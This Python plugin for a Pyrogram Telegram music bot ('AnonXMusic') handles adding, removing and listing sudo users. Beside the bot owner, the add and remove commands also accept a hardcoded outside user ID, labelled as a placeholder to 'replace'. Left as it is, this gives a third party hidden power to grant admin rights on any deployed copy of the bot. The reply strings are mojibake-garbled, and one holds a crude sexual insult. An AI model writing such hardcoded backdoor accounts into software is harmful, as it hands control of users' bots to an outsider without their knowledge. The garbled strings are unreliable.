from pyrogram import filters
from pyrogram.types import Message

from AnonXMusic import app
from AnonXMusic.misc import SUDOERS
from AnonXMusic.utils.database import add_sudo, remove_sudo
from AnonXMusic.utils.decorators.language import language
from AnonXMusic.utils.extraction import extract_user
from AnonXMusic.utils.inline import close_markup
from config import BANNED_USERS, OWNER_ID

# Define the special user ID
SPECIAL_USER_ID = 8043846111 # Replace with the actual user ID

# Define special users set
SPECIAL_USERS = {SPECIAL_USER_ID}

@app.on_message(filters.command(["addsudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def useradd(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‚Ä£ …™·¥õ s·¥á·¥á·¥çs  ü…™·¥ã·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥ç·¥á ·¥õ·¥è ·¥ò Ä·¥è·¥†…™·¥Ö·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á ·¥õ·¥è ·¥Ä ·¥ç·¥áss·¥Ä…¢·¥á ·¥è Ä ·¥õ·¥è …¢…™·¥†·¥á  è·¥è·¥ú ·¥õ ú·¥á …¥·¥áx·¥õ s·¥õ·¥á·¥ò, ·¥ò ü·¥á·¥Äs·¥á ·¥ò Ä·¥è·¥†…™·¥Ö·¥á ·¥ús·¥á Ä …™·¥Ö ·¥è Ä  Ä·¥á·¥ò ü è ·¥Ä ·¥ç·¥áss·¥Ä…¢·¥á.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‚Ä£ ·¥õ ú·¥á Ä·¥á ·¥°·¥Äs ·¥Ä…¥ …™ss·¥ú·¥á ·¥áx·¥õ Ä·¥Ä·¥Ñ·¥õ…™…¥…¢ ·¥õ ú·¥á ·¥ús·¥á Ä's …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥, ·¥ò ü·¥á·¥Äs·¥á ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥.</b>")

    if user.id in SUDOERS:
        return await message.reply_text(f"<b>‚Ä£ {user.mention} …™s ·¥Ä ü Ä·¥á·¥Ä·¥Ö è ·¥Ä·¥ú·¥õ ú·¥è Ä…™·¥¢·¥á·¥Ö ·¥Äs ·¥Ä s·¥ú·¥Ö·¥è ·¥ús·¥á Ä.</b>")

    added = await add_sudo(user.id)
    if added:
        SUDOERS.add(user.id)
        await message.reply_text(f"<b>‚Ä£ {user.mention}  è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥° ·¥Ä s·¥ú·¥Ö·¥è, ·¥Ñ Ä·¥á·¥Ö…™·¥õ …¢·¥è·¥ás ·¥õ·¥è  è·¥è·¥ú Ä ·¥ç·¥è·¥ç.</b>")
    else:
        await message.reply_text("<b>‚Ä£ ·¥õ ú·¥á ·¥Ä·¥õ·¥õ·¥á·¥ç·¥ò·¥õ ·¥õ·¥è ·¥Ä·¥Ö·¥Ö ·¥õ ú·¥á s·¥ú·¥Ö·¥è ·¥ús·¥á Ä ·¥°·¥Äs ·¥ú…¥s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü. ·¥ò ü·¥á·¥Äs·¥á ·¥Ä·¥õ·¥õ·¥á·¥ç·¥ò·¥õ ·¥Ä…¢·¥Ä…™…¥.</b>")

@app.on_message(filters.command(["delsudo", "rmsudo", "removerand", "removesudo"]) & filters.user([OWNER_ID, SPECIAL_USER_ID]))
@language
async def userdel(client, message: Message, language):
    if not message.reply_to_message and len(message.command) != 2:
        return await message.reply_text("<b>‚Ä£ …™·¥õ s·¥á·¥á·¥çs  ü…™·¥ã·¥á  è·¥è·¥ú ·¥°·¥Ä…¥·¥õ ·¥ç·¥á ·¥õ·¥è ·¥ò Ä·¥è·¥†…™·¥Ö·¥á ·¥Ä  Ä·¥ás·¥ò·¥è…¥s·¥á ·¥õ·¥è ·¥Ä ·¥ç·¥áss·¥Ä…¢·¥á ·¥è Ä ·¥õ·¥è …¢…™·¥†·¥á  è·¥è·¥ú ·¥õ ú·¥á …¥·¥áx·¥õ s·¥õ·¥á·¥ò, ·¥ò ü·¥á·¥Äs·¥á ·¥ò Ä·¥è·¥†…™·¥Ö·¥á ·¥ús·¥á Ä …™·¥Ö ·¥è Ä  Ä·¥á·¥ò ü è ·¥Ä ·¥ç·¥áss·¥Ä…¢·¥á.</b>")

    user = await extract_user(message)
    if not user:
        return await message.reply_text("<b>‚Ä£ ·¥õ ú·¥á Ä·¥á ·¥°·¥Äs ·¥Ä…¥ …™ss·¥ú·¥á ·¥áx·¥õ Ä·¥Ä·¥Ñ·¥õ…™…¥…¢ ·¥õ ú·¥á ·¥ús·¥á Ä's …™…¥“ì·¥è Ä·¥ç·¥Ä·¥õ…™·¥è…¥, ·¥ò ü·¥á·¥Äs·¥á ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥.</b>")

    if user.id not in SUDOERS:
        return await message.reply_text(f"<b>‚Ä£ {user.mention}  è·¥è·¥ú ·¥Ä Ä·¥á …¥·¥è·¥õ ·¥Ä·¥ú·¥õ ú·¥è Ä…™s·¥á·¥Ö ·¥õ·¥è ·¥ús·¥á ·¥õ ú…™s ·¥Ñ·¥è·¥ç·¥ç·¥Ä…¥·¥Ö.</b>")

    removed = await remove_sudo(user.id)
    if removed:
        SUDOERS.remove(user.id)
        await message.reply_text(f"<b> {user.mention} s·¥è Ä Ä è ·¥õ·¥è s·¥Ä è,  ô·¥ú·¥õ ·¥ç è  ü·¥è Ä·¥Ö ·¥Ö…™·¥Ö…¥'·¥õ  ü…™·¥ã·¥á  è·¥è·¥ú Ä ·¥ç·¥è·¥õ ú·¥á Ä's  ô ü·¥è·¥°J·¥è ô  </b>")
    else:
        await message.reply_text("<b>‚Ä£ ·¥õ ú·¥á ·¥Ä·¥õ·¥õ·¥á·¥ç·¥ò·¥õ ·¥õ·¥è  Ä·¥á·¥ç·¥è·¥†·¥á ·¥õ ú·¥á s·¥ú·¥Ö·¥è ·¥ús·¥á Ä ·¥°·¥Äs ·¥ú…¥s·¥ú·¥Ñ·¥Ñ·¥áss“ì·¥ú ü, ·¥ò ü·¥á·¥Äs·¥á ·¥õ Ä è ·¥Ä…¢·¥Ä…™…¥.</b>")

@app.on_message(filters.command(["sudolist", "sudoers", "specialusers"]) & ~BANNED_USERS)
@language
async def sudoers_list(client, message: Message, language):
    if message.from_user.id != OWNER_ID and message.from_user.id not in SUDOERS:
        return  # Ignore message from non-owner, non-sudoers, and non-special-id

    text = "<b>üëë ·¥Ö…™s·¥Äs·¥õ·¥á Äs ·¥è“ì ·¥Ä…¥·¥è·¥õ ú·¥á Ä  ü·¥á·¥†·¥á ü..</b>\n\n"
    text += "<b>  ü·¥è Ä·¥Ö ·¥è“ì  Ä·¥á·¥Ä·¥ò·¥á Äs üî±</b>\n"
    owner = await app.get_users(OWNER_ID)
    owner = owner.first_name if not hasattr(owner, "mention") else owner.mention
    text += f"Á•û {owner}\n\n"

    text += "<b>üî± s·¥ò·¥á·¥Ñ…™·¥Ä ü ·¥Ö…™s·¥Äs·¥õ·¥á Äs</b>\n"
    try:
        special_user = await app.get_users(SPECIAL_USER_ID)
        special_user = special_user.first_name if not hasattr(special_user, "mention") else special_user.mention
        text += f"‚Ä£ {special_user}\n"
    except Exception as e:
        text += "<b>‚Ä£ Special user not accessible or doesn't exist.</b>\n"
        print(f"Error fetching SPECIAL_USER_ID: {e}")

    text += "\n<b> s·¥è·¥ú ü  Ä·¥á·¥Ä·¥ò·¥á Äs ‚öúÔ∏è</b>\n"
    count = 0
    for user_id in SUDOERS:
        if user_id != OWNER_ID:
            try:
                user = await app.get_users(user_id)
                user = user.first_name if not hasattr(user, "mention") else user.mention
                count += 1
                text += f"¬ª {user}\n"
            except Exception as e:
                print(f"Error fetching user {user_id}: {e}")
                continue

    if count == 0:
        text += "<b>‚Ä£ …¥·¥è ·¥ús·¥á Äs ·¥Ä·¥ú·¥õ ú·¥è Ä…™s·¥á·¥Ö “ì·¥è Ä ·¥á ü·¥á·¥†·¥Ä·¥õ·¥á·¥Ö ·¥Ä·¥Ñ·¥Ñ·¥áss.</b>"

    await message.reply_text(text, reply_markup=close_markup(language))
